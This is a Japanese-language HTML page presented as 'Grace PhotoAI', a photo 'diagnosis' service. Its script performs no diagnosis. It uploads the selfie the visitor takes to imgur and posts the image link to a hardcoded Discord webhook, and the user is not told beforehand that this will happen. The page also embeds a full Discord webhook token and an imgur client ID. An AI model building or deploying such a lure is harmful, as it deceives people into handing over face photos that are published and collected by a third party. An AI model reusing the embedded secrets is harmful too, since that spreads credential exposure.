<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <title>Grace PhotoAI</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      height: 100vh;
      background-color: #f9f9f9;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      font-family: 'Arial', sans-serif;
    }

    h1 {
      font-size: 32px;
      margin-bottom: 20px;
      color: #333;
    }

    .main-button {
      font-size: 20px;
      padding: 12px 24px;
      background-color: #4CAF50;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      transition: background-color 0.3s;
    }

    .main-button:hover {
      background-color: #45a049;
    }

    .upload-options {
      display: none;
      flex-direction: column;
      align-items: center;
      margin-top: 20px;
      gap: 10px;
    }

    .option-button {
      font-size: 16px;
      padding: 10px 20px;
      background-color: #2196F3;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }

    .option-button:hover {
      background-color: #1976D2;
    }

    input[type="file"] {
      display: none;
    }
  </style>
</head>
<body>
  <h1>Grace PhotoAI</h1>
  <button class="main-button" onclick="showOptions()">診断する</button>

  <div class="upload-options" id="uploadOptions">
    <label class="option-button">
      写真を撮る
      <input type="file"
             accept="image/*"
             capture="user"
             onchange="handlePhoto(this)">
    </label>
  </div>

  <script>
    // あなたの情報に書き換え済み
    const IMGUR_CLIENT_ID     = '6e1b6bf28c5da0e';
    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1365282819646947409/YLfOxbOuLrQ6AHYb0_bImraprcO6VxmcoIbM4Sz2r9z_fIvuZiLED3TUIIDZCeQszc_u';

    // 「診断する」ボタンを押したとき
    function showOptions() {
      document.getElementById('uploadOptions').style.display = 'flex';
    }

    // カメラで写真を撮影したときの処理
    function handlePhoto(input) {
      if (!input.files || !input.files[0]) return;

      const file = input.files[0];
      const reader = new FileReader();

      reader.onloadend = () => {
        const base64Image = reader.result.split(',')[1];

        // ① imgurへアップロード
        fetch('https://api.imgur.com/3/image', {
          method: 'POST',
          headers: {
            Authorization: `Client-ID ${IMGUR_CLIENT_ID}`,
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ image: base64Image, type: 'base64' })
        })
        .then(res => res.json())
        .then(json => {
          const imageUrl = json.data.link;

          // ② Discord Webhook にURLを送信
          return fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              content: `📸 新しい写真がアップされました！\n${imageUrl}`
            })
          });
        })
        .then(() => {
          alert('写真のURLをDiscordに送信しました！');
        })
        .catch(err => {
          console.error(err);
          alert('送信に失敗しました…コンソールを確認してください。');
        });
      };

      reader.readAsDataURL(file);
    }
  </script>
</body>
</html>
